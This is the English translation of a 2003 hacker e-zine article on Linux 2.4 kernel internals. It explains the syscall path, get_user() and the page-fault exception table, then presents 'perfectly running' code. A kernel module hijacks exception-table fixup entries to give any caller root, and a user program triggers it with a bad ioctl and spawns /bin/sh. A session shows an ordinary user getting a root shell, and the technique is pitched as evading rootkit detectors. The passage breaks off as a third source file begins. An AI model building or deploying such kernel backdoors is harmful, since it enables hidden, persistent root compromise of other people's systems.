@@ -1,0 +1,2283 @@
+-[ BFi - English version ]----------------------------------------------------
+        BFi is an e-zine written by the Italian hacker community.
+        Full source code and original Italian version are available at:
+                http://bfi.s0ftpj.org/dev/BFi12-dev-08
+	French translation available at:
+	        http://bfi.s0ftpj.org/dev/fr/BFi12-dev-08-fr
+        English version translated by Tanith <lorettaharlowe@yahoo.it>
+------------------------------------------------------------------------------
+
+
+
+==============================================================================
+--------------------[ BFi12-dev - file 08 - 29/12/2003 ]----------------------
+==============================================================================
+
+
+-[ DiSCLAiMER ]---------------------------------------------------------------
+        The whole stuff contained in BFi has informative and educational
+	purposes only. In no event the authors could be considered liable
+	for damages caused to people or things due to the use of code,
+	programs, pieces of information, techniques published on the e-zine.
+	BFi is a free and autonomous way of expression; we, the authors,
+	are as free to write BFi as you are free to go on reading or to stop
+	doing it right now. Therefore, if you think you could be harmed by
+	the topics covered and/or by the way they are in, * stop reading
+	immediately and remove these files from your computer * .
+	You, the reader, will keep to youself all the responsabilities about
+	the use you will do of the information published on BFi by going on.
+	You are not allowed to post BFi to the newsgroups and to spread
+	*parts* of the magazine: please distribute BFi in its original and
+	complete form.
+------------------------------------------------------------------------------
+
+
+-[ HACKiNG ]------------------------------------------------------------------
+---[ BiSH0P iN C7... PAGE FAULT!
+-----[ buffer <buffer@antifork.org> - http://buffer.antifork.org
+
+Author can't be held responsible for any incorrect, silly, or illegal
+employment of stuff contained in this article.
+
+The sole purpose this article aims to is knowledge and this is why I'm
+releasing perfectly running code.
+
+0x00. Preliminary remarks
+0x01. Introduction
+0x02. Kernel and some other nice stuff
+0x03. Page Fault Handler
+0x04. Wandering from the subject
+0x05. Code
+0x06. Revelation
+0x07. When game gets tough...
+0x08. Code over and over again
+0x09. How to infect modules
+0x0a. Moving towards darkness
+0x0b. Unsecured ideas
+0x0c. Final considerations
+0x0d. Thanks
+0x0e. References
+
+
+0x00. Preliminary remarks
+=========================
+This article is the natural evolution of the article I published in Phrack #61,
+of which you can find a corrected version in my homepage. Despite this, I'll
+pretend you haven't read it and I will start again from the beginning to avoid
+referrings that could be too floating.
+
+Special thanks to twiz, the guy who helped me remarking a particular I hadn't
+remarked within a discussion about Antifork Research inner mailing list. This
+new version of the code you can find in the bottom is also a creature of him.
+
+
+0x01. Introduction
+==================
+Let's say it. We're really fed up with LKM. They're giving it to us in every
+possible way. At present, the question you're posing to you is 'which could be
+the reason that drive this guy to present it to us in another way?'. Hmmm, I
+don't have the right answer. However, I think there is a bit of pithy stuff in
+this modus operandi that could disclose rather interesting prospects. At now, I
+have many tortuous ideas about how to extend these funny things I'm to present
+you. Some of them are quite trivial, some others aren't. I'll talk about some
+of them, not about others.
+
+So let's start. I'll have at first to make a comment. By now, everyone is able
+to redirect a system call and you don't have to be an outstanding guru to write
+a trivial LKM that can do it. But we are not discussing whether is elitist or
+not to write a LKM. The very problem is that this LKM tipology can be easily
+found out... too easily, I think. All you need is the symbol sys_call_table.
+Exported till the 2.4 kernel version, it won't be in the next one, the 2.6
+(Redhat doesn't even export it in his 2.4 version) but this is the least
+problem. To find out this attack tipology, we've seen time after time the
+appearance of many tools with differents approaches. KSTAT [5] by FuSyS
+approaches this problem by using an user space control and is an excellent tool
+that can be very useful to sysadmin to get out of thorny situations. AngeL [6]
+approaches the problem from the point of view of kernel space by implementing a
+wrapping system and signatures to accomplish real-time control.
+Since I write that section on my own, I won't talk about that, otherwise you
+could think I like to boast myself... :)
+
+I'm not going to sum up about how you can accomplish redirection. Please, read
+Silvio Cesare[4] to learn that!
+
+Later on, we've seen different approaches. After a while, LKMs have appeared in
+order to lay hands on VFS methods. I'm not talking about VFS to avoid
+monopolizing next 72 issues of BFi. You just need to know that KSTAT
+counteracts this kind of attacks.
+
+A few later, in Phrack #59, a guy named kad showed me an attack based on
+interrupt handler[7] redirection; actually, AngeL finds out also this tipology
+of real-time attacks. Anyway, I'm not going to tell you who is the author of
+that code... :)
+
+As it was said a few ago, in a local version of Moore's law, attacks toward
+kernel are a endless chess game. You move a pawn, I countermove. Well, watch
+out! I'm going to move the bishop...
+
+
+0x02. Kernel and some other nice stuff
+======================================
+During the treatment I will refer to 2.4.23 kernel and to the previous ones...
+and I should say also the following ones! Why am I so sure about that? The
+answer is simple: the feature of catching licit or illicit situations by using
+page fault handler is a choice made by Linus Torvalds and the code which
+implements it is probably older than many people among you and will be still
+running when your first grand-son will be born. On its own, the feature
+increments very much system performances but surely the man who invented it
+wouldn't have thought it could have been an overthrow object.
+
+Let's try to be metodical. How do you call a syscall? Some stone tables dated
+about 1200 b.C. have been founded, and they demonstrate even Egyptians knew the
+power of interrupt software 0x80 for architetture x86. Thus, Linus and his
+colleagues haven't invented anything, not in this sector at least.
+
+If interrupt software is called (and who calls him is usually the syscall
+wrapper implemented by glibc) the exception handler system_call() execution
+starts. Let's have a look at a piece of that taken by arch/i386/kernel/entry.S .
+
+
+ENTRY(system_call)
+        pushl %eax                      # save orig_eax
+        SAVE_ALL
+        GET_CURRENT(%ebx)
+        testb $0x02,tsk_ptrace(%ebx)    # PT_TRACESYS
+        jne tracesys
+        cmpl $(NR_syscalls),%eax
+        cmpl $(NR_syscalls),%eax
+        jae badsys
+        call *SYMBOL_NAME(sys_call_table)(,%eax,4)
+        movl %eax,EAX(%esp)             # save the return value
+[..]
+
+
+It's all clear, isn't it? Hmm the expression of your face doesn't agree...
+let's see exactly what happens. system_call() exception handler saves the value
+originally included in %eax register, since Linux uses that register to return
+the syscall return value to user space. After this, all registers are saved in
+the kernel mode stack by using SAVE_ALL macro. Then the macro GET_CURRENT(),
+necessary to extract a task_struct pointer characterizing the syscall-executing
+process. Let's see shortly how it works
+
+
+#define GET_CURRENT(reg) \
+        movl $-8192, reg; \
+        andl %esp, reg
+
+
+Thus, GET_CURRENT(%ebx) only places in %ebx register value -8192 and puts it in
+AND with the kernel mode stack pointer value. Particularly, -8192 corresponds
+to the hexadecimal 0xffffe000 that in the binary representation is a series of
+19 1 bits followed by 13 0 bits. So, if someone hasn't understood yet, this is
+a mask to reset by using AND the last esp 13 bits. Let's try to find out the
+reason.
+
+Since the kernel 2.2 period, Linux organizes task_structs in unions task_union
+with this structure.
+
+#ifndef INIT_TASK_SIZE
+# define INIT_TASK_SIZE 2048*sizeof(long)
+#endif
+
+union task_union {
+        struct task_struct task;
+        unsigned long stack[INIT_TASK_SIZE/sizeof(long)];
+}
+
+The task_struct structure is smaller than 8kB (if we consider x86 architecture
+this is INIT_TASK_SIZE value). Then we can say task_union size is 8kB and is
+always aligned at 8kB. The task_struct has lower addresses and all is over that
+is reserved to kernel mode stack (about 7200 bytes) which, as usual, expands
+towards lower addresses. It is now easy to understand GET_CURRENT() game. It
+resets kernel mode stack pointer last 13 bits. It is also easy to understand
+that, after this process, %ebx contains task_struct address.
+
+Coming back to code, some tests (not important for our purposes) are executed
+to check if the process is traced at that moment and if the syscall
+representative number included in %eax is valid.
+
+Then you call call *SYMBOL_NAME(sys_call_table)(,%eax,4). This call reads the
+address where to jump from syscall table, whose base address is contained in
+the symbol sys_call_table. The syscall representative number (see
+include/asm-i386/unistd.h) included in %eax is used as an offset inside the
+table. For example, if we are calling read(2), since #define __NR_read 3 we are
+choosing the third entry of the table. This entry includes sys_read() address,
+that is the real system call, and then it will be executed.
+
+I'd like to represent a particular syscall subset that as a really interesting
+attitude.
+
+
+asmlinkage long sys_ioctl(unsigned int fd, unsigned int cmd, unsigned long
+arg)
+        struct file * filp;
+        unsigned int flag;
+        int on, error = -EBADF;
+[..]
+         case FIONBIO:
+               if ((error = get_user(on, (int *)arg)) != 0)
+                       break;
+               flag = O_NONBLOCK;
+[..]
+
+
+This syscall (but there are many others) takes as a parameter a pointer passed
+by user space and it's the third argument. For example, if we want to set
+non-blocking I/O mode on file descriptor fd, in our hypothetic program we'll
+write
+
+
+int     on = 1;
+        ioctl(fd, FIONBIO, &on);
+
+
+Then, the third parameter is an address. Now please remark that funny function
+named get_user(). That's part of that functions class that are very near to
+black magic and it's of use for copying an argument from user space to kernel
+space. Let's see how it works.
+
+
+#define __get_user_x(size,ret,x,ptr) \
+        __asm__ __volatile__("call __get_user_" #size \
+                :"=a" (ret),"=d" (x) \
+                :"0" (ptr))
+/* Careful: we have to cast the result to the type of the pointer for sign
+reasons */
+#define get_user(x,ptr)                                                 \
+({      int __ret_gu,__val_gu;                                          \
+        switch(sizeof (*(ptr))) {                                       \
+        case 1:  __get_user_x(1,__ret_gu,__val_gu,ptr); break;          \
+        case 2:  __get_user_x(2,__ret_gu,__val_gu,ptr); break;          \
+        case 4:  __get_user_x(4,__ret_gu,__val_gu,ptr); break;          \
+        default: __get_user_x(X,__ret_gu,__val_gu,ptr); break;          \
+        }                                                               \
+        (x) = (__typeof__(*(ptr)))__val_gu;                             \
+        __ret_gu;                                                       \
+
+
+Anyone good at inline asm? Ok, ok, it's all to me! Well, get_user() is
+implemented in a very smart way, since it first understands how many bytes
+we want to transfer. This by using the switch-case of the value obtained by
+valuating sizeof(*(ptr)). We can suppose that, like in our example, its value
+is 4. It'll be called then
+
+
+__get_user_x(4,__ret_gu,__val_gu,ptr);
+
+
+This call can also be said
+
+
+__asm__ __volatile__("call __get_user_4 \ 
+		      :"=a" (__ret_gu),"=d" (__val_gu) \ 
+                      : "0" (ptr))
+
+
+You look like quite shocked...I'm going to explain it, in a minute. We are
+calling now __get_user_4. What is more, by examining asm inline syntax we find
+out that ptr pointer is passed to %eax register and output will be returned
+through __ret_gu to %eax register and through __val_gu to %edx register.
+
+Now, either you trust on me or you go and study inline asm because I'm not
+going to explain syntax.
+
+Let's see now how __get_user_4() appears.
+
+
+addr_limit = 12
+[..]
+.align 4
+.globl __get_user_4
+__get_user_4:
+        addl $3,%eax
+        movl %esp,%edx
+        jc bad_get_user
+        andl $0xffffe000,%edx
+        cmpl addr_limit(%edx),%eax
+        jae bad_get_user
+3:      movl -3(%eax),%edx
+        xorl %eax,%eax
+        ret
+bad_get_user:
+        xorl %edx,%edx
+        movl $-14,%eax
+        ret
+.section __ex_table,"a"
+        .long 1b,bad_get_user
+        .long 2b,bad_get_user
+        .long 3b,bad_get_user
+.previous
+
+
+At the beginning, there is a checking. We've already said ptr is passed to
+%eax register. Then you add 3 to %eax value. However, since we have to copy
+from user space 4 bytes, this is but the larger user space address we are
+going to access to complete copy operation. This is checked by comparing it
+with addr_limit(%edx). What's that? You can remark last 13 bits are resetted by
+kernel mode stack pointer by using movl and andl, thus getting pointer to
+task_struct. Later on we compare offset 12 (addr_limit) value with %eax. At
+offset 12 there is also current->addr_limit.seg, that is the larger user space
+address, that is (PAGE_OFFSET - 1) which, in x86 architecture, has the value of
+0xbfffffff. If %eax contains a value larger than (PAGE_OFFSET -1) you jump to
+bad_get_user, in which %edx is resetted and as a return value in %eax is chosen
+-14 (-EFAULT). Otherwise, if it's all right, four bytes pointed by ptr (it
+decreases of 3 %eax to balance the addiction operation necessary to get
+control) are moved to %edx and %eax is setted to 0. In this case, the copy
+operation has been successful.
+
+
+0x03. Page fault handler
+========================
+If, after adding 3, %eax value is still less than (PAGE_OFFSET - 1) and this
+address is not part of the process-addressing space, what would happen? In
+these cases, operating systems theory would deal with page fault exception.
+Let's see what it means and how this situation is dealt in our specific case.
+
+"A page fault exception is raised when the addressed page is not present in
+memory, the corresponding page table entry is null or a violation of the paging
+protection mechanism has occurred." [1]
+
+This definition could look quite concise and mysterious, though actually it
+explains all has to be explained. Let's study it in detail.
+
+If there is a page fault in the kernel mode there can be three different cases.
+The first one, the most frequent, is the Demand Paging, or the Copy-On-Write.
+
+"the kernel attempts to address a page belonging to the process address space,
+but either the corresponding page frame does not exist (Demand Paging) or the
+kernel is trying to write a read-only page (Copy On Write)." [1]
+
+Demand Paging occurs when a page is mapped in the process-address space but
+doesn't exist in physical memory. Who has a lot of troubles with VM should have
+to know that, when a process is created by using sys_execve(), kernel prepares
+its address space by booking memory areas named memory regions. A memory region
+looks like this way.
+
+
+struct vm_area_struct {
+        struct mm_struct * vm_mm;       /* The address space we belong to. */
+        unsigned long vm_start;         /* Our start address within vm_mm. */
+        unsigned long vm_end;           /* The first byte after our end address
+                                           within vm_mm. */
+
+        /* linked list of VM areas per task, sorted by address */
+
+        struct vm_area_struct *vm_next;
+        pgprot_t vm_page_prot;          /* Access permissions of this VMA. */
+        unsigned long vm_flags;         /* Flags, listed below. */
+        rb_node_t vm_rb;
+
+        /*
+         * For areas with an address space and backing store,
+         * one of the address_space->i_mmap{,shared} lists,
+         * for shm areas, the list of attaches, otherwise unused.
+         */
+
+        struct vm_area_struct *vm_next_share;
+        struct vm_area_struct **vm_pprev_share;
+
+        /* Function pointers to deal with this struct. */
+        struct vm_operations_struct * vm_ops;
+        /* Information about our backing store: */
+        unsigned long vm_pgoff;         /* Offset (within vm_file) in PAGE_SIZE
+                                           units, *not* PAGE_CACHE_SIZE */
+        struct file * vm_file;          /* File we map to (can be NULL). */
+        unsigned long vm_raend;         /* XXX: put full readahead info here. */
+        void * vm_private_data;         /* was vm_pte (shared mem) */
+}
+
+
+Fields vm_start and vm_end show where the memory region starts and where it
+ends in the **virtual** address space. In fact, you can't be sure a memory
+region always has a correspondant in physical memory, while you can always be
+sure about the opposite.
+
+If we suppose we don't have the page mapped in the memory, when we try to get
+there, kernel will check memory region effectively exists and isn't mapped in
+physical memory and will take care on allocating a page in the physical memory.
+After this, we can go on without any problem. This is Demand Paging.
+
+Now, let's see Copy-On-Write. Copy-On-Write is a mechanism that allows you
+having a huge system-performances increment. In fact, as everyone knows, on
+UNIX systems the only way to create a new process is using the fork(2) +
+execve(2) sequence.
+fork(2) creates a child process. What is more, child process must have the same
+address space than the father. This would force fork(2) to copy whole father
+address space to child. Let's think about it. If fork(2) is followed by
+execve(2), the latter will clear the whole child address space so meticulously
+created to place in it a completely new one.
+
+Also, since in 99% of cases fork(2) is followed by execve(2) (just think to
+your beloved shell...) we can realize the game is not worth the candle. This
+consciousness legacy can be remarked in sys_vfork(), but we aren't dealing with
+that. Now, how does Copy-On-Write work?
+It's quite easy. If we do a fork(2), this doesn't copy anything in the
+child address space, but it marks father memory pages as read-only and it takes
+care about incrementing an inner counter to manage this situation. For our
+purposes, we can avoid taking into consideration this question details, I guess
+thus everybody is happy.
+
+Then, when we execute execve(2), just when we try to put hands on address space
+trying to modify it, we'll knock on a page access rights violation... that is,
+page fault!
+At that moment, page fault handler manages everything saving you from many
+useless operations. These 2 cases occur almost everytime during uptime process,
+are completely legal and completely useless for our purposes.
+Important remark. Kernel can easily understand if we are in one of these two
+cases as, by scanning memory regions list, it finds out one of them containing
+virtual address that caused page fault.
+
+The second case is related to a kernel bug. It can happen...
+
+"some kernel function includes a programming bug that causes the exception to
+be raised when the program is executed; alternatively, the exception might be
+caused by a transient hardware error." [1]
+
+The third case is the one we are interested in and it is the one I was
+referring to before.
+
+"when a system call service routine attempts to read or write into a memory
+area whose address has been passed as a system call parameter, but that address
+does not belong to the process address space." [1]
+
+Well, now let's try to think how kernel can distinguish last two cases. When
+one of the two occurs to us, it's easy to understand.
+Infact, when, while analyzing process address space, is found out that virtual
+address belongs to no memory region then one of the two cases is occurring.
+Which one?
+To find it out, Linux uses a table named exception table. This table is made of
+couples of addresses usually named insn and fixup. The idea is quite simple. We
+take for sure kernel functions acceding to user space are very few. We've
+already found some of them.
+
+Let's reflect about one of these, for example __get_user_4() .
+
+
+addr_limit = 12
+[..]
+.align 4
+.globl __get_user_4
+__get_user_4:
+        addl $3,%eax
+        movl %esp,%edx
+        jc bad_get_user
+        andl $0xffffe000,%edx
+        cmpl addr_limit(%edx),%eax
+        jae bad_get_user
+3:      movl -3(%eax),%edx
+        xorl %eax,%eax
+        ret
+bad_get_user:
+        xorl %edx,%edx
+        movl $-14,%eax
+        ret
+.section __ex_table,"a"
+        .long 1b,bad_get_user
+        .long 2b,bad_get_user
+        .long 3b,bad_get_user
+.previous
+
+
+Now, we can remark that in __get_user_4() code, instruction that effectively
+allows us to have access to user space is instruction 
+
+
+	movl -3(%eax),%edx
+
+
+An interesting remark. This instruction is labelled 3. We'll have to remember
+it cause we'll need it very soon. Then, if we aren't facing either Demand
+Paging or Copy-On-Write, this is the instruction creating troubles. The idea is
+to insert in the exception table this instruction address, by inserting it as
+field insn. Let's see what happens in the third case we examined before by
+having a look at the code.
+
+
+	/* Are we prepared to handle this kernel fault?  */
+        if ((fixup = search_exception_table(regs->eip)) != 0) {
+                regs->eip = fixup;
+                return;
+       }
+
+
+This code fragment explains it very clearly. In fact, after checking we are
+neither in Demand Paging case nor in Copy-On-Write one, it goes and check
+exception table. If this case occurs, regs->eip is updated and its value is
+then the same as the fixup one, included in the table. This can also be defined
+a jump into fixup code. Are you confused? Let's examine this case. We've seen
+this code fragment.
+
+
+bad_get_user:
+        xorl %edx,%edx
+        movl $-14,%eax
+        ret
+.section __ex_table,"a"
+        .long 1b,bad_get_user
+        .long 2b,bad_get_user
+        .long 3b,bad_get_user
+.previous
+
+
+We've also seen in __get_user_4() instruction labeled 3 is the one that can
+cause troubles. Now, let's look in section __ex_table entry
+
+
+	.long 3b,bad_get_user
+
+
+To let everyone understand it, this means we are introducing into exception
+table an entry like this one
+
+
+	insn  : address of movl -3(%eax),%edx
+        fixup : address of bad_get_user
+
+
+'b' letter in 3b means backward and it means label references previously
+defined code. It means little for comprehension so we can also pretend not to
+see it. :)
+
+Thus, if we suppose to access user space through __get_user_4() and supposing
+referenced address isn't in process address space, kernel will check exception
+table. It will then find the entry we've just examined and then it will jump to
+fixup address, in this case it will then execute bad_get_user(), that simply
+puts into %eax value -14 (-EFAULT), it resets %edx and it returns.
+
+
+0x04. Wandering from the subject
+================================
+
+Now we are able to see how we can make the most of all this to our not actually
+completely good purposes. In memory, exception table is bounded by two
+non-exported symbols, that are __start___ex_table and __stop___ex_table. Let's
+try to find them out through System.map .
+
+
+buffer@rigel:/usr/src/linux$ grep ex_table System.map
+c0261e20 A __start___ex_table
+c0264548 A __stop___ex_table
+buffer@rigel:/usr/src/linux$
+
+
+We can find out other information also from System.map the same way.
+
+
+buffer@rigel:/usr/src/linux$ grep bad_get_user System.map
+c022f39c t bad_get_user
+buffer@rigel:/usr/src/linux$ grep __get_user_ System.map
+c022f354 T __get_user_1
+c022f368 T __get_user_2
+c022f384 T __get_user_4
+buffer@rigel:/usr/src/linux$ grep __get_user_ /proc/ksyms
+c022f354 __get_user_1
+c022f368 __get_user_2
+c022f384 __get_user_4
+
+
+Then __get_user_x() are exported. We'll need that later on.
+We have enough information to overthrow system. In fact, we expect to find in
+exception table such entries like these three ones.
+
+
+	c022f354 + offset1      c022f39c
+        c022f368 + offset2      c022f39c
+        c022f384 + offset3      c022f39c
+
+
+corresponding to three __get_user_x(). We don't usually know offset values but
+we don't care since we know where exception table starts and where it ends
+thanks to __start___ex_table and __stop___ex_table and we also know these three
+entries' field fixup is 0xc022f39c .
+So it's extremely easy to find them. And what when we have found them? Well,
+just think what would happen if we substitute fixup code address (in this case
+0xc022f39c) with a routine of us address. In the situation we described before,
+path would jump to our routine and this one would be executed with the most of
+privileges. Is it getting interesting? We could then wonder 'how can we force
+this situation?' If you've been attentive till now, you'll have no difficulty
+to realize an instruction such as the following one is enough
+
+
+	ioctl(fd, FIONBIO, NULL);
+
+
+in a user space program and kernel will thus execute what you want it to
+execute. In fact, in this case NULL is surely out of process address space.
+Don't you believe it?
+
+
+0x05. Code
+==========
+
+This is the code I showed on Phrack #61 and, let's say it, it really
+sucks. It's not necessary to edit hard-coded values. When we insmode, we
+only have to pass them to insmode according to what you get from your
+System.map analysis. Hook substituting bad_get_user only resets uid and euid
+to 0.
+
+An example of how using it
+
+insmod exception-uid.o start_ex_table=0xc0261e20 end_ex_table=0xc0264548
+bad_get_user=0xc022f39c
+
+
+<-| pagefault/exception.c |->
+/*
+ * Filename: exception.c
+ * Creation date: 23.05.2003
+ * Copyright (c) 2003 Angelo Dell'Aera <buffer@antifork.org>
+ *
+ * This program is free software; you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation; either version 2 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA  02111-1307  USA
+ */
+
+#ifndef __KERNEL__
+#  define __KERNEL__
+#endif
+
+#ifndef MODULE
+#  define MODULE
+#endif
+
+#define __START___EX_TABLE 0xc0261e20
+#define __END___EX_TABLE   0xc0264548
+#define BAD_GET_USER       0xc022f39c
+
+unsigned long start_ex_table = __START___EX_TABLE;
+unsigned long end_ex_table = __END___EX_TABLE;
+unsigned long bad_get_user = BAD_GET_USER;
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/slab.h>
+#include <linux/init.h>
+
+#ifdef FIXUP_DEBUG
+#  define PDEBUG(fmt, args...) printk(KERN_DEBUG "[fixup] : " fmt, ##args)
+#else
+#  define PDEBUG(fmt, args...) do {} while(0)
+#endif
+
+MODULE_PARM(start_ex_table, "l");
+MODULE_PARM(end_ex_table, "l");
+MODULE_PARM(bad_get_user, "l");
+
+
+struct old_ex_entry {
+        struct old_ex_entry     *next;
+        unsigned long           address;
+        unsigned long           insn;
+        unsigned long           fixup;
+};
+  
+struct old_ex_entry *ex_old_table;
+
+
+void hook(void)
+{
+	current->uid = current->euid = 0;
+} 
+
+
+void exception_cleanup(void)
+{
+        struct old_ex_entry     *entry = ex_old_table;
+        struct old_ex_entry     *tmp;
+
+        if (!entry)
+                return;
+
+        while (entry) {
+                *(unsigned long *)entry->address = entry->insn;
+                *(unsigned long *)((entry->address) 
+			+ sizeof(unsigned long)) = entry->fixup;
+                tmp = entry->next;
+                kfree(entry);
+                entry = tmp;
+        }
+
+        return;
+}
+
+
+int exception_init(void)
+{
+        unsigned long       insn = start_ex_table;
+        unsigned long       fixup;
+        struct old_ex_entry *entry, *last_entry;
+
+        ex_old_table = NULL;
+        PDEBUG(KERN_INFO "hook at address : %p\n", (void *)hook);
+
+        for(; insn < end_ex_table; insn += 2 * sizeof(unsigned long)) {
+
+                fixup = insn + sizeof(unsigned long);
+
+                if (*(unsigned long *)fixup == BAD_GET_USER) {
+
+                        PDEBUG(KERN_INFO "address : %p insn: %lx fixup : %lx\n",
+                                        (void *)insn, *(unsigned long *)insn,
+                                        *(unsigned long *)fixup);
+
+                        entry = (struct old_ex_entry *)kmalloc(sizeof(struct old_ex_entry),
+								GFP_KERNEL);
+        
+                        if (!entry)
+                                return -1;
+
+                        entry->next = NULL;
+                        entry->address = insn;
+                        entry->insn = *(unsigned long *)insn;
+                        entry->fixup = *(unsigned long *)fixup;
+
+                        if (ex_old_table) {
+                                last_entry = ex_old_table;
+
+                        	while(last_entry->next != NULL)
+                                	last_entry = last_entry->next;
+
+                                last_entry->next = entry;
+                        } else
+                                ex_old_table = entry;
+                
+                        *(unsigned long *)fixup = (unsigned long)hook;
+
+                        PDEBUG(KERN_INFO "address : %p insn: %lx fixup : %lx\n",
+                                        (void *)insn, *(unsigned long *)insn,
+                                        *(unsigned long *)fixup);
+
+
+                }
+
+        }
+
+        return 0;
+}
+
+module_init(exception_init);
+module_exit(exception_cleanup);
+MODULE_LICENSE("GPL");
+<-X->
+
+This is user space code. Note that, before executing whichever operation I
+execute malicious ioctl(2). If you execute this code without insmoding LKM, the
+result will always be a /bin/sh but your privileges will be the same. Try and
+see.
+
+
+<-| pagefault/shell.c |->
+ /*
+ * Filename: shell.c
+ * Creation date: 23.05.2003
+ * Copyright (c) 2003 Angelo Dell'Aera <buffer@antifork.org>
+ *
+ * This program is free software; you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation; either version 2 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA  02111-1307  USA
+ */
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <errno.h>
+#include <sys/ioctl.h>
+
+int main()
+{
+        int     fd;
+        int     res;
+        char    *argv[2];
+
+        argv[0] = "/bin/sh";
+        argv[1] = NULL;
+
+        fd = open("testfile", O_RDWR | O_CREAT, S_IRWXU);
+        res = ioctl(fd, FIONBIO, NULL);
+        printf("result = %d errno = %d\n", res, errno);
+        execve(argv[0], argv, NULL);
+        return 0;
+}
+<-X->
+
+Let's see how it works...
+
+buffer@rigel:~$ su
+Password:
+bash-2.05b# insmod exception-uid.o
+bash-2.05b# exit
+buffer@rigel:~$ gcc -o shell shell.c
+buffer@rigel:~$ id
+uid=500(buffer) gid=100(users) groups=100(users)
+buffer@rigel:~$ ./shell
+result = 25 errno = 0
+sh-2.05b# id
+uid=0(root) gid=100(users) groups=100(users)
+sh-2.05b#
+
+Phrack article ended here, considering that, since this behaviour can only be
+forced by strongly bugged user space programs, it's not easy a
+user/sysadmin/wandering traveller can run into this behaviour. You can find
+useless ethic, moral and social consideration in that article.
+Let's stop talking about that!
+
+After publishing that article, I've been seized by an undefined sense of
+unsatisfaction that led me asking whether it was necessary to "running so long
+around my prey before hunting it". Thanks to a flash of inspiration caused by
+somewhat magic word suggested by twiz, I realized I could do it much better.
+Particularly, the needing of System.map to run the whole program was something
+I didn't like at all...
+
+
+0x06. Revelation
+================
+
+Kernel sees itself as a module and is included in the module list, in the
+bottom. What is more, each module has its own private exception table...
+
+
+0x07. When game gets tough...
+=============================
+
+Hmm, things are getting clearer, darkness is fading and light is peeping in...
+I hear a soft voice whispering "You'll find solution in struct module...". I
+weak up, it looks like I've had a nightmare, I switch on my trusty laptop and
+I trust on whispering voice...
+
+
+struct module {
+        unsigned long size_of_struct;   /* == sizeof(module) */
+        struct module *next;
+        const char *name;
+        unsigned long size;
+        union
+        {
+                atomic_t usecount;
+                long pad;
+        } uc;                           /* Needs to keep its size - so says rth */
+        unsigned long flags;            /* AUTOCLEAN et al */
+        unsigned nsyms;
+        unsigned ndeps;
+        struct module_symbol *syms;
+        struct module_ref *deps;
+        struct module_ref *refs;
+        int (*init)(void);
+        void (*cleanup)(void);
+        const struct exception_table_entry *ex_table_start;
+        const struct exception_table_entry *ex_table_end;
+#ifdef __alpha__
+        unsigned long gp;
+#endif
+        /* Members past this point are extensions to the basic
+           module support and are optional.  Use mod_member_present()
+           to examine them.  */
+        const struct module_persist *persist_start;
+        const struct module_persist *persist_end;
+        int (*can_unload)(void);
+        int runsize;                    /* In modutils, not currently used */
+        const char *kallsyms_start;     /* All symbols for kernel debugging */
+        const char *kallsyms_end;
+        const char *archdata_start;     /* arch specific data for module */
+        const char *archdata_end;
+        const char *kernel_data;        /* Reserved for kernel internal use */
+}
+
+
+When I look at the powerful kingdom of ex_table_start and ex_table_end fields,
+I immediately realize I don't need __start___ex_table and __stop___ex_table
+symbols anymore. In fact, as I insmode my LKM, it goes into the module list.
+
+Now, we scan the list till the last struct module, that represents kernel, so I
+can also take it there.
+
+I'll paste kernel associated struct module as it appears in kernel/module.c .
+
+
+struct module kernel_module =
+{
+        size_of_struct:         sizeof(struct module),
+        name:                   "",
+        uc:                     {ATOMIC_INIT(1)},
+        flags:                  MOD_RUNNING,
+        syms:                   __start___ksymtab,
+        ex_table_start:         __start___ex_table,
+        ex_table_end:           __stop___ex_table,
+        kallsyms_start:         __start___kallsyms,
+        kallsyms_end:           __stop___kallsyms,
+};
+
+
+I only have to find out bad_get_user address. Now two things come back in my mind
+
+
+.section __ex_table,"a"
+        .long 1b,bad_get_user
+        .long 2b,bad_get_user
+        .long 3b,bad_get_user
+.previous
+
+root@mintaka:~# grep __get_user /proc/ksyms
+c02559fc __get_user_1
+c0255a10 __get_user_2
+c0255a2c __get_user_4
+
+
+NOTE: Who finds different values in the addresses to, that is due to fact I'm
+using another computer :) If someone remarked it, he's very smart...
+
+What's interesting in that? Well, there is something. Exception table three
+entries are running in succession in the memory, thanks to the way they've
+been inserted, and this not unimportant if we think __get_user_x are exported
+symbols. Shall I be more clear? We know __get_user_1, __get_user_2 and
+__get_user_4 addresses, we know where the exception table begins and where it
+ends, we also know those three entries are running in succession in the
+memory... We can thus start reading insns from the beginning table. We'll find
+a match when insn will be included between __get_user_1 and __get_user_2. This
+is because instruction offset gains access to __get_user_1 user space, instead
+of __get_user_1 first instruction. Once the match has happened, it's done. We
+know fixup value and bad_get_user one. Now we don't need anymore System.map ...
+
+
+0x08. Code over and over again
+==============================
+This code shows the previously described technique.
+
+<-| pagefault/exception3.c |->
+/*
+ * exception3.c
+ * Creation date: 02.09.2003
+ * Copyright(c) 2003 Angelo Dell'Aera <buffer@antifork.org>
+ *
+ * This program is free software; you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation; either version 2 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA  02111-1307  USA
+ *
+ */
+
+
+/*
